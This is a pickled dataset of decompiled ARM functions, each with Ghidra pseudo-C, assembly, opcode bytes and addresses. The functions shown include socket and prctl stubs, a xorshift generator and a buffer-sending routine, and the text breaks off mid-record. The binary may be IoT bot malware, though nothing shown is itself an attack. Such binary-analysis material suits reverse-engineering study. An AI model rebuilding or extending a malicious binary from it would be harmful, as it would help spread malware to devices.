(dp0
S'_FINI_0'
p1
(S'\n__stdcall _FINI_0()\n'
p2
V\u000avoid _FINI_0(void)\u000a\u000a{\u000a  if (*PTR___bss_start___00008c50 == 0) {\u000a    *PTR___bss_start___00008c50 = 1;\u000a  }\u000a  return;\u000a}\u000a\u000a
p3
S'ldr r2,[0x8c50]\nldrb r3,[r2,#0x0]\ncmp r3,#0x0\naddeq r3,r3,#0x1\nstrbeq r3,[r2,#0x0]\nbx lr\n'
p4
S'10 20 9f e5\n00 30 d2 e5\n00 00 53 e3\n01 30 83 02\n00 30 c2 05\n1e ff 2f e1\n'
p5
S'.text:00008c38\n.text:00008c3c\n.text:00008c40\n.text:00008c44\n.text:00008c48\n.text:00008c4c\n'
p6
tp7
sS'FUN_0000b9c0'
p8
(S'\n__stdcall FUN_0000b9c0()\n'
p9
V\u000aundefined4 FUN_0000b9c0(int iParm1,uint *puParm2)\u000a\u000a{\u000a  undefined4 *puVar1;\u000a  \u000a  puVar1 = (undefined4 *)(PTR_DAT_0000ba28 + iParm1 * 8);\u000a  if (puParm2 != (uint *)0x0) {\u000a    *puParm2 = (uint)*(ushort *)(puVar1 + 1);\u000a  }\u000a  return *puVar1;\u000a}\u000a\u000a
p10
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x10\nstr r0,[r11,#-0x18]\nstr r1,[r11,#-0x1c]\nldr r3,[r11,#-0x18]\nmov r3,r3, lsl #0x3\ncpy r2,r3\nldr r3,[0xba28]\nadd r3,r2,r3\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x1c]\ncmp r3,#0x0\nbeq 0x0000ba10\nldr r3,[r11,#-0x10]\nldrh r3,[r3,#0x4]\ncpy r2,r3\nldr r3,[r11,#-0x1c]\nstr r2,[r3,#0x0]\nldr r3,[r11,#-0x10]\nldr r3,[r3,#0x0]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p11
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n10 d0 4d e2\n18 00 0b e5\n1c 10 0b e5\n18 30 1b e5\n83 31 a0 e1\n03 20 a0 e1\n3c 30 9f e5\n03 30 82 e0\n10 30 0b e5\n1c 30 1b e5\n00 00 53 e3\n04 00 00 0a\n10 30 1b e5\nb4 30 d3 e1\n03 20 a0 e1\n1c 30 1b e5\n00 20 83 e5\n10 30 1b e5\n00 30 93 e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p12
S'.text:0000b9c0\n.text:0000b9c4\n.text:0000b9c8\n.text:0000b9cc\n.text:0000b9d0\n.text:0000b9d4\n.text:0000b9d8\n.text:0000b9dc\n.text:0000b9e0\n.text:0000b9e4\n.text:0000b9e8\n.text:0000b9ec\n.text:0000b9f0\n.text:0000b9f4\n.text:0000b9f8\n.text:0000b9fc\n.text:0000ba00\n.text:0000ba04\n.text:0000ba08\n.text:0000ba0c\n.text:0000ba10\n.text:0000ba14\n.text:0000ba18\n.text:0000ba1c\n.text:0000ba20\n.text:0000ba24\n'
p13
tp14
sS'select'
p15
(S'\n__stdcall select(int __nfds, fd_set * __readfds, fd_set * __writefds, fd_set * __exceptfds, timeval * __timeout)\n'
p16
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint select(int __nfds,fd_set *__readfds,fd_set *__writefds,fd_set *__exceptfds,timeval *__timeout)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a3c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140fc)();\u000a  return iVar1;\u000a}\u000a\u000a
p17
S'adr r12,0x8a3c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6c0]!\n'
p18
S'00 c6 8f e2\n0b ca 8c e2\nc0 f6 bc e5\n'
p19
S'.plt:00008a34\n.plt:00008a38\n.plt:00008a3c\n'
p20
tp21
sS'sendto'
p22
(S'\n__stdcall sendto(int __fd, void * __buf, size_t __n, int __flags, sockaddr * __addr, socklen_t __addr_len)\n'
p23
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000assize_t sendto(int __fd,void *__buf,size_t __n,int __flags,sockaddr *__addr,socklen_t __addr_len)\u000a\u000a{\u000a  ssize_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ae4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00014134)();\u000a  return sVar1;\u000a}\u000a\u000a
p24
S'adr r12,0x8ae4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x650]!\n'
p25
S'00 c6 8f e2\n0b ca 8c e2\n50 f6 bc e5\n'
p26
S'.plt:00008adc\n.plt:00008ae0\n.plt:00008ae4\n'
p27
tp28
sS'FUN_0000b2a4'
p29
(S'\n__stdcall FUN_0000b2a4()\n'
p30
V\u000aundefined4 FUN_0000b2a4(void)\u000a\u000a{\u000a  uint uVar1;\u000a  \u000a  uVar1 = *(uint *)PTR_DAT_0000b368 ^ *(uint *)PTR_DAT_0000b368 << 0xb;\u000a  *(undefined4 *)PTR_DAT_0000b368 = *(undefined4 *)PTR_DAT_0000b36c;\u000a  *(undefined4 *)PTR_DAT_0000b36c = *(undefined4 *)PTR_DAT_0000b370;\u000a  *(undefined4 *)PTR_DAT_0000b370 = *(undefined4 *)PTR_DAT_0000b374;\u000a  *(uint *)PTR_DAT_0000b374 = *(uint *)PTR_DAT_0000b374 >> 0x13 ^ *(uint *)PTR_DAT_0000b374;\u000a  *(uint *)PTR_DAT_0000b374 = *(uint *)PTR_DAT_0000b374 ^ uVar1 ^ uVar1 >> 8;\u000a  return *(undefined4 *)PTR_DAT_0000b374;\u000a}\u000a\u000a
p31
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x8\nldr r3,[0xb368]\nldr r3,[r3,#0x0]\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\nmov r2,r3, lsl #0xb\nldr r3,[r11,#-0x10]\neor r3,r3,r2\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\nmov r2,r3, lsr #0x8\nldr r3,[r11,#-0x10]\neor r3,r3,r2\nstr r3,[r11,#-0x10]\nldr r3,[0xb36c]\nldr r2,[r3,#0x0]\nldr r3,[0xb368]\nstr r2,[r3,#0x0]\nldr r3,[0xb370]\nldr r2,[r3,#0x0]\nldr r3,[0xb36c]\nstr r2,[r3,#0x0]\nldr r3,[0xb374]\nldr r2,[r3,#0x0]\nldr r3,[0xb370]\nstr r2,[r3,#0x0]\nldr r3,[0xb374]\nldr r3,[r3,#0x0]\nmov r2,r3, lsr #0x13\nldr r3,[0xb374]\nldr r3,[r3,#0x0]\neor r2,r2,r3\nldr r3,[0xb374]\nstr r2,[r3,#0x0]\nldr r3,[0xb374]\nldr r2,[r3,#0x0]\nldr r3,[r11,#-0x10]\neor r2,r2,r3\nldr r3,[0xb374]\nstr r2,[r3,#0x0]\nldr r3,[0xb374]\nldr r3,[r3,#0x0]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p32
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n08 d0 4d e2\nac 30 9f e5\n00 30 93 e5\n10 30 0b e5\n10 30 1b e5\n83 25 a0 e1\n10 30 1b e5\n02 30 23 e0\n10 30 0b e5\n10 30 1b e5\n23 24 a0 e1\n10 30 1b e5\n02 30 23 e0\n10 30 0b e5\n7c 30 9f e5\n00 20 93 e5\n70 30 9f e5\n00 20 83 e5\n70 30 9f e5\n00 20 93 e5\n64 30 9f e5\n00 20 83 e5\n64 30 9f e5\n00 20 93 e5\n58 30 9f e5\n00 20 83 e5\n54 30 9f e5\n00 30 93 e5\na3 29 a0 e1\n48 30 9f e5\n00 30 93 e5\n03 20 22 e0\n3c 30 9f e5\n00 20 83 e5\n34 30 9f e5\n00 20 93 e5\n10 30 1b e5\n03 20 22 e0\n24 30 9f e5\n00 20 83 e5\n1c 30 9f e5\n00 30 93 e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p33
S'.text:0000b2a4\n.text:0000b2a8\n.text:0000b2ac\n.text:0000b2b0\n.text:0000b2b4\n.text:0000b2b8\n.text:0000b2bc\n.text:0000b2c0\n.text:0000b2c4\n.text:0000b2c8\n.text:0000b2cc\n.text:0000b2d0\n.text:0000b2d4\n.text:0000b2d8\n.text:0000b2dc\n.text:0000b2e0\n.text:0000b2e4\n.text:0000b2e8\n.text:0000b2ec\n.text:0000b2f0\n.text:0000b2f4\n.text:0000b2f8\n.text:0000b2fc\n.text:0000b300\n.text:0000b304\n.text:0000b308\n.text:0000b30c\n.text:0000b310\n.text:0000b314\n.text:0000b318\n.text:0000b31c\n.text:0000b320\n.text:0000b324\n.text:0000b328\n.text:0000b32c\n.text:0000b330\n.text:0000b334\n.text:0000b338\n.text:0000b33c\n.text:0000b340\n.text:0000b344\n.text:0000b348\n.text:0000b34c\n.text:0000b350\n.text:0000b354\n.text:0000b358\n.text:0000b35c\n.text:0000b360\n.text:0000b364\n'
p34
tp35
sS'prctl'
p36
(S'\n__stdcall prctl(int __option)\n'
p37
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint prctl(int __option,...)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a00. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_000140e8)();\u000a  return iVar1;\u000a}\u000a\u000a
p38
S'adr r12,0x8a00\nadd r12,r12,#0xb000\nldr pc,[r12,#0x6e8]!\n'
p39
S'00 c6 8f e2\n0b ca 8c e2\ne8 f6 bc e5\n'
p40
S'.plt:000089f8\n.plt:000089fc\n.plt:00008a00\n'
p41
tp42
sS'htons'
p43
(S'\n__stdcall htons(uint16_t __hostshort)\n'
p44
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000auint16_t htons(uint16_t __hostshort)\u000a\u000a{\u000a  uint16_t uVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b5c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  uVar1 = (*(code *)PTR_LAB_0001415c)((uint)__hostshort);\u000a  return uVar1;\u000a}\u000a\u000a
p45
S'adr r12,0x8b5c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x600]!\n'
p46
S'00 c6 8f e2\n0b ca 8c e2\n00 f6 bc e5\n'
p47
S'.plt:00008b54\n.plt:00008b58\n.plt:00008b5c\n'
p48
tp49
sS'FUN_0000a074'
p50
(S'\n__stdcall FUN_0000a074()\n'
p51
V\u000auint FUN_0000a074(void)\u000a\u000a{\u000a  int iVar1;\u000a  uint local_14;\u000a  \u000a  if (*(int *)PTR_DAT_0000a0e8 != 0) {\u000a    close(*(int *)PTR_DAT_0000a0e8);\u000a    *(undefined4 *)PTR_DAT_0000a0e8 = 0;\u000a  }\u000a  iVar1 = FUN_00009c3c();\u000a  local_14 = (uint)(iVar1 == 0);\u000a  return local_14;\u000a}\u000a\u000a
p52
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x8\nldr r3,[0xa0e8]\nldr r3,[r3,#0x0]\ncmp r3,#0x0\nbeq 0x0000a0b0\nldr r3,[0xa0e8]\nldr r3,[r3,#0x0]\ncpy r0,r3\nbl 0x00008bcc\nldr r2,[0xa0e8]\nmov r3,#0x0\nstr r3,[r2,#0x0]\nbl 0x00009c3c\ncpy r3,r0\ncmp r3,#0x0\nbne 0x0000a0cc\nmov r3,#0x1\nstr r3,[r11,#-0x10]\nb 0x0000a0d4\nmov r3,#0x0\nstr r3,[r11,#-0x10]\nldr r3,[r11,#-0x10]\ncpy r0,r3\nsub sp,r11,#0xc\nldmia sp,{ r11 sp lr }\nbx lr\n'
p53
S'0d c0 a0 e1\n00 d8 2d e9\n04 b0 4c e2\n08 d0 4d e2\n5c 30 9f e5\n00 30 93 e5\n00 00 53 e3\n06 00 00 0a\n4c 30 9f e5\n00 30 93 e5\n03 00 a0 e1\nc9 fa ff eb\n3c 20 9f e5\n00 30 a0 e3\n00 30 82 e5\ne1 fe ff eb\n00 30 a0 e1\n00 00 53 e3\n02 00 00 1a\n01 30 a0 e3\n10 30 0b e5\n01 00 00 ea\n00 30 a0 e3\n10 30 0b e5\n10 30 1b e5\n03 00 a0 e1\n0c d0 4b e2\n00 68 9d e8\n1e ff 2f e1\n'
p54
S'.text:0000a074\n.text:0000a078\n.text:0000a07c\n.text:0000a080\n.text:0000a084\n.text:0000a088\n.text:0000a08c\n.text:0000a090\n.text:0000a094\n.text:0000a098\n.text:0000a09c\n.text:0000a0a0\n.text:0000a0a4\n.text:0000a0a8\n.text:0000a0ac\n.text:0000a0b0\n.text:0000a0b4\n.text:0000a0b8\n.text:0000a0bc\n.text:0000a0c0\n.text:0000a0c4\n.text:0000a0c8\n.text:0000a0cc\n.text:0000a0d0\n.text:0000a0d4\n.text:0000a0d8\n.text:0000a0dc\n.text:0000a0e0\n.text:0000a0e4\n'
p55
tp56
sS'strcpy'
p57
(S'\n__stdcall strcpy(char * __dest, char * __src)\n'
p58
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000achar * strcpy(char *__dest,char *__src)\u000a\u000a{\u000a  char *pcVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x000089c4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  pcVar1 = (char *)(*(code *)PTR_LAB_000140d4)();\u000a  return pcVar1;\u000a}\u000a\u000a
p59
S'adr r12,0x89c4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x710]!\n'
p60
S'00 c6 8f e2\n0b ca 8c e2\n10 f7 bc e5\n'
p61
S'.plt:000089bc\n.plt:000089c0\n.plt:000089c4\n'
p62
tp63
sS'htonl'
p64
(S'\n__stdcall htonl(uint32_t __hostlong)\n'
p65
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000auint32_t htonl(uint32_t __hostlong)\u000a\u000a{\u000a  uint32_t uVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ad8. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  uVar1 = (*(code *)PTR_LAB_00014130)();\u000a  return uVar1;\u000a}\u000a\u000a
p66
S'adr r12,0x8ad8\nadd r12,r12,#0xb000\nldr pc,[r12,#0x658]!\n'
p67
S'00 c6 8f e2\n0b ca 8c e2\n58 f6 bc e5\n'
p68
S'.plt:00008ad0\n.plt:00008ad4\n.plt:00008ad8\n'
p69
tp70
sS'listen'
p71
(S'\n__stdcall listen(int __fd, int __n)\n'
p72
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint listen(int __fd,int __n)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008afc. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_0001413c)();\u000a  return iVar1;\u000a}\u000a\u000a
p73
S'adr r12,0x8afc\nadd r12,r12,#0xb000\nldr pc,[r12,#0x640]!\n'
p74
S'00 c6 8f e2\n0b ca 8c e2\n40 f6 bc e5\n'
p75
S'.plt:00008af4\n.plt:00008af8\n.plt:00008afc\n'
p76
tp77
sS'_INIT_0'
p78
(S'\n__stdcall _INIT_0()\n'
p79
V\u000avoid _INIT_0(void)\u000a\u000a{\u000a  if ((*(int *)PTR_DAT_00008c88 != 0) && (DAT_00008c8c != (code *)0x0)) {\u000a    (*DAT_00008c8c)();\u000a  }\u000a  return;\u000a}\u000a\u000a
p80
S'str lr,[sp,#-0x4]!\nldr r0,[0x8c88]\nldr r3,[r0,#0x0]\ncmp r3,#0x0\nsub sp,sp,#0x4\nbeq 0x00008c7c\nldr r3,[0x8c8c]\ncmp r3,#0x0\ncpyne lr,pc\nbxne r3\nadd sp,sp,#0x4\nldr lr,[sp],#0x4\nbx lr\n'
p81
S'04 e0 2d e5\n28 00 9f e5\n00 30 90 e5\n00 00 53 e3\n04 d0 4d e2\n03 00 00 0a\n18 30 9f e5\n00 00 53 e3\n0f e0 a0 11\n13 ff 2f 11\n04 d0 8d e2\n04 e0 9d e4\n1e ff 2f e1\n'
p82
S'.text:00008c54\n.text:00008c58\n.text:00008c5c\n.text:00008c60\n.text:00008c64\n.text:00008c68\n.text:00008c6c\n.text:00008c70\n.text:00008c74\n.text:00008c78\n.text:00008c7c\n.text:00008c80\n.text:00008c84\n'
p83
tp84
sS'rand'
p85
(S'\n__stdcall rand()\n'
p86
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint rand(void)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008ab4. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014124)();\u000a  return iVar1;\u000a}\u000a\u000a
p87
S'adr r12,0x8ab4\nadd r12,r12,#0xb000\nldr pc,[r12,#0x670]!\n'
p88
S'00 c6 8f e2\n0b ca 8c e2\n70 f6 bc e5\n'
p89
S'.plt:00008aac\n.plt:00008ab0\n.plt:00008ab4\n'
p90
tp91
sS'strlen'
p92
(S'\n__stdcall strlen(char * __s)\n'
p93
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000asize_t strlen(char *__s)\u000a\u000a{\u000a  size_t sVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008b98. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  sVar1 = (*(code *)PTR_LAB_00014170)();\u000a  return sVar1;\u000a}\u000a\u000a
p94
S'adr r12,0x8b98\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5d8]!\n'
p95
S'00 c6 8f e2\n0b ca 8c e2\nd8 f5 bc e5\n'
p96
S'.plt:00008b90\n.plt:00008b94\n.plt:00008b98\n'
p97
tp98
sS'bind'
p99
(S'\n__stdcall bind(int __fd, sockaddr * __addr, socklen_t __len)\n'
p100
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint bind(int __fd,sockaddr *__addr,socklen_t __len)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008a90. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014118)();\u000a  return iVar1;\u000a}\u000a\u000a
p101
S'adr r12,0x8a90\nadd r12,r12,#0xb000\nldr pc,[r12,#0x688]!\n'
p102
S'00 c6 8f e2\n0b ca 8c e2\n88 f6 bc e5\n'
p103
S'.plt:00008a88\n.plt:00008a8c\n.plt:00008a90\n'
p104
tp105
sS'_exit'
p106
(S'\n__stdcall _exit(int __status)\n'
p107
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000avoid _exit(int __status)\u000a\u000a{\u000a                    /* WARNING: Could not recover jumptable at 0x00008b8c. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  (*(code *)PTR_LAB_0001416c)();\u000a  return;\u000a}\u000a\u000a
p108
S'adr r12,0x8b8c\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5e0]!\n'
p109
S'00 c6 8f e2\n0b ca 8c e2\ne0 f5 bc e5\n'
p110
S'.plt:00008b84\n.plt:00008b88\n.plt:00008b8c\n'
p111
tp112
sS'FUN_0000bc3c'
p113
(S'\n__stdcall FUN_0000bc3c()\n'
p114
V\u000auint FUN_0000bc3c(uint uParm1,uint uParm2)\u000a\u000a{\u000a  uint uVar1;\u000a  int iVar2;\u000a  uint uVar3;\u000a  bool bVar4;\u000a  \u000a  if (uParm2 - 1 == 0) {\u000a    return uParm1;\u000a  }\u000a  if (uParm2 == 0) {\u000a    FUN_0000bd50();\u000a    return 0;\u000a  }\u000a  if (uParm1 <= uParm2) {\u000a    return (uint)(uParm1 == uParm2);\u000a  }\u000a  if ((uParm2 & uParm2 - 1) == 0) {\u000a    if (uParm2 < 0x10000) {\u000a      iVar2 = 0;\u000a    }\u000a    else {\u000a      uParm2 = uParm2 >> 0x10;\u000a      iVar2 = 0x10;\u000a    }\u000a    if (0xff < uParm2) {\u000a      uParm2 = uParm2 >> 8;\u000a      iVar2 = iVar2 + 8;\u000a    }\u000a    if (0xf < uParm2) {\u000a      uParm2 = uParm2 >> 4;\u000a      iVar2 = iVar2 + 4;\u000a    }\u000a    if (uParm2 < 5) {\u000a      uVar3 = iVar2 + (uParm2 >> 1);\u000a    }\u000a    else {\u000a      uVar3 = iVar2 + 3;\u000a    }\u000a    return uParm1 >> (uVar3 & 0xff);\u000a  }\u000a  if ((uParm2 & 0xe0000000) == 0) {\u000a    uParm2 = uParm2 << 3;\u000a    uVar3 = 8;\u000a  }\u000a  else {\u000a    uVar3 = 1;\u000a  }\u000a  while (uParm2 < 0x10000000 && uParm2 < uParm1) {\u000a    uParm2 = uParm2 << 4;\u000a    uVar3 = uVar3 << 4;\u000a  }\u000a  while (uParm2 < 0x80000000 && uParm2 < uParm1) {\u000a    uParm2 = uParm2 << 1;\u000a    uVar3 = uVar3 << 1;\u000a  }\u000a  uVar1 = 0;\u000a  while( true ) {\u000a    if (uParm2 <= uParm1) {\u000a      uParm1 = uParm1 - uParm2;\u000a      uVar1 = uVar1 | uVar3;\u000a    }\u000a    if (uParm2 >> 1 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 1);\u000a      uVar1 = uVar1 | uVar3 >> 1;\u000a    }\u000a    if (uParm2 >> 2 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 2);\u000a      uVar1 = uVar1 | uVar3 >> 2;\u000a    }\u000a    if (uParm2 >> 3 <= uParm1) {\u000a      uParm1 = uParm1 - (uParm2 >> 3);\u000a      uVar1 = uVar1 | uVar3 >> 3;\u000a    }\u000a    bVar4 = uParm1 == 0;\u000a    if (!bVar4) {\u000a      uVar3 = uVar3 >> 4;\u000a      bVar4 = uVar3 == 0;\u000a    }\u000a    if (bVar4) break;\u000a    uParm2 = uParm2 >> 4;\u000a  }\u000a  return uVar1;\u000a}\u000a\u000a
p115
S'subs r2,r1,#0x1\nbxeq lr\nbcc 0x0000bd24\ncmp r0,r1\nbls 0x0000bcdc\ntst r1,r2\nbeq 0x0000bce8\ntst r1,#0xe0000000\nmoveq r1,r1, lsl #0x3\nmoveq r3,#0x8\nmovne r3,#0x1\ncmp r1,#0x10000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x4\nmovcc r3,r3, lsl #0x4\nbcc 0x0000bc68\ncmp r1,#0x80000000\ncmpcc r1,r0\nmovcc r1,r1, lsl #0x1\nmovcc r3,r3, lsl #0x1\nbcc 0x0000bc7c\nmov r2,#0x0\ncmp r0,r1\nsubcs r0,r0,r1\norrcs r2,r2,r3\ncmp r0,r1, lsr #0x1\nsubcs r0,r0,r1, lsr #0x1\norrcs r2,r2,r3, lsr #0x1\ncmp r0,r1, lsr #0x2\nsubcs r0,r0,r1, lsr #0x2\norrcs r2,r2,r3, lsr #0x2\ncmp r0,r1, lsr #0x3\nsubcs r0,r0,r1, lsr #0x3\norrcs r2,r2,r3, lsr #0x3\ncmp r0,#0x0\nmovnes r3,r3, lsr #0x4\nmovne r1,r1, lsr #0x4\nbne 0x0000bc94\ncpy r0,r2\nbx lr\nmoveq r0,#0x1\nmovne r0,#0x0\nbx lr\ncmp r1,#0x10000\nmovcs r1,r1, lsr #0x10\nmovcs r2,#0x10\nmovcc r2,#0x0\ncmp r1,#0x100\nmovcs r1,r1, lsr #0x8\naddcs r2,r2,#0x8\ncmp r1,#0x10\nmovcs r1,r1, lsr #0x4\naddcs r2,r2,#0x4\ncmp r1,#0x4\naddhi r2,r2,#0x3\naddls r2,r2,r1, lsr #0x1\nmov r0,r0, lsr r2\nbx lr\nstr lr,[sp,#-0x8]!\nbl 0x0000bd50\nmov r0,#0x0\nldr lr,[sp],#0x8\nbx lr\n'
p116
S'01 20 51 e2\n1e ff 2f 01\n36 00 00 3a\n01 00 50 e1\n22 00 00 9a\n02 00 11 e1\n23 00 00 0a\n0e 02 11 e3\n81 11 a0 01\n08 30 a0 03\n01 30 a0 13\n01 02 51 e3\n00 00 51 31\n01 12 a0 31\n03 32 a0 31\nfa ff ff 3a\n02 01 51 e3\n00 00 51 31\n81 10 a0 31\n83 30 a0 31\nfa ff ff 3a\n00 20 a0 e3\n01 00 50 e1\n01 00 40 20\n03 20 82 21\na1 00 50 e1\na1 00 40 20\na3 20 82 21\n21 01 50 e1\n21 01 40 20\n23 21 82 21\na1 01 50 e1\na1 01 40 20\na3 21 82 21\n00 00 50 e3\n23 32 b0 11\n21 12 a0 11\nef ff ff 1a\n02 00 a0 e1\n1e ff 2f e1\n01 00 a0 03\n00 00 a0 13\n1e ff 2f e1\n01 08 51 e3\n21 18 a0 21\n10 20 a0 23\n00 20 a0 33\n01 0c 51 e3\n21 14 a0 21\n08 20 82 22\n10 00 51 e3\n21 12 a0 21\n04 20 82 22\n04 00 51 e3\n03 20 82 82\na1 20 82 90\n30 02 a0 e1\n1e ff 2f e1\n08 e0 2d e5\n08 00 00 eb\n00 00 a0 e3\n08 e0 9d e4\n1e ff 2f e1\n'
p117
S'.text:0000bc3c\n.text:0000bc40\n.text:0000bc44\n.text:0000bc48\n.text:0000bc4c\n.text:0000bc50\n.text:0000bc54\n.text:0000bc58\n.text:0000bc5c\n.text:0000bc60\n.text:0000bc64\n.text:0000bc68\n.text:0000bc6c\n.text:0000bc70\n.text:0000bc74\n.text:0000bc78\n.text:0000bc7c\n.text:0000bc80\n.text:0000bc84\n.text:0000bc88\n.text:0000bc8c\n.text:0000bc90\n.text:0000bc94\n.text:0000bc98\n.text:0000bc9c\n.text:0000bca0\n.text:0000bca4\n.text:0000bca8\n.text:0000bcac\n.text:0000bcb0\n.text:0000bcb4\n.text:0000bcb8\n.text:0000bcbc\n.text:0000bcc0\n.text:0000bcc4\n.text:0000bcc8\n.text:0000bccc\n.text:0000bcd0\n.text:0000bcd4\n.text:0000bcd8\n.text:0000bcdc\n.text:0000bce0\n.text:0000bce4\n.text:0000bce8\n.text:0000bcec\n.text:0000bcf0\n.text:0000bcf4\n.text:0000bcf8\n.text:0000bcfc\n.text:0000bd00\n.text:0000bd04\n.text:0000bd08\n.text:0000bd0c\n.text:0000bd10\n.text:0000bd14\n.text:0000bd18\n.text:0000bd1c\n.text:0000bd20\n.text:0000bd24\n.text:0000bd28\n.text:0000bd2c\n.text:0000bd30\n.text:0000bd34\n'
p118
tp119
sS'raise'
p120
(S'\n__stdcall raise(int __sig)\n'
p121
V\u000a/* WARNING: Unknown calling convention yet parameter storage is locked */\u000a\u000aint raise(int __sig)\u000a\u000a{\u000a  int iVar1;\u000a  \u000a                    /* WARNING: Could not recover jumptable at 0x00008be0. Too many branches */\u000a                    /* WARNING: Treating indirect jump as call */\u000a  iVar1 = (*(code *)PTR_LAB_00014188)();\u000a  return iVar1;\u000a}\u000a\u000a
p122
S'adr r12,0x8be0\nadd r12,r12,#0xb000\nldr pc,[r12,#0x5a8]!\n'
p123
S'00 c6 8f e2\n0b ca 8c e2\na8 f5 bc e5\n'
p124
S'.plt:00008bd8\n.plt:00008bdc\n.plt:00008be0\n'
p125
tp126
sS'FUN_0000911c'
p127
(S'\n__stdcall FUN_0000911c()\n'
p128
V\u000assize_t FUN_0000911c(int iParm1,char *pcParm2,int iParm3)\u000a\u000a{\u000a  char *__s;\u000a  size_t __n;\u000a  ssize_t local_18;\u000a  \u000a  __s = (char *)malloc(0x800);\u000a  memset(__s,0,0x800);\u000a  __n = strlen(pcParm2);\u000a  memcpy(__s,pcParm2,__n);\u000a  if (iParm3 == 1) {\u000a    __n = strlen(__s);\u000a    send(iParm1,__s,__n,0x4000);\u000a  }\u000a  else {\u000a    __n = strlen(__s);\u000a    local_18 = send(iParm1,__s,__n,0x4000);\u000a    send(iParm1,PTR_DAT_000091fc,2,0x4000);\u000a  }\u000a  return local_18;\u000a}\u000a\u000a
p129
S'cpy r12,sp\nstmdb sp!,{ r11 r12 lr pc}\nsub r11,r12,#0x4\nsub sp,sp,#0x18\nstr r0,[r11,#-0x18]\nstr r1,[r11,#-0x1c]\nstr r2,[r11,#-0x20]\nmov r0,#0x800\nbl 0x00008a10\ncpy r3,r0\nstr r3,[r11,#-0x10]\nldr r0,[r11,#-0x10]\nmov r1,#0x0\nmov r2,#0x800\nbl 0x00008b18\nldr r0,[r11,#-0x1c]\nbl 0x00008b90\ncpy r3,r0\nldr r0,[r11,#-0x10]\nldr r1,[r11,#-0x1c]\ncpy r2,r3\nbl 0x00008a04\nldr r3,[r11,#-0x20]\ncmp r3,#0x1\nbne 0x000091a8\nldr r3,[r11,#-0x10]\ncpy r0,r3\nbl 0x00008b90\ncpy r3,r0\nldr r0,[r11,#-0x18]\nldr r1,[r11,#-0x10]\ncpy r2,r3\nmov r3,#0x4000\nbl 0x00008a4c\nb 0x000091e8\nldr r3,[r11,#-0x10]\ncpy r0,r3\nbl 0x00008b90\ncpy r3,r0\nldr r0,[r11,#-0x18]\nldr r1,[r11,#-0x10]\ncpy r2,r3\nmov r3,#0x4000\nbl 0x00008a4c\ncpy r3,r0\nstr r3,[r11,#-0x14]\nldr r0,[r11,#-0x18]\nldr r1,[0x91fc]\nmov r2,#0x2\nmov r3,#0x4000\nbl 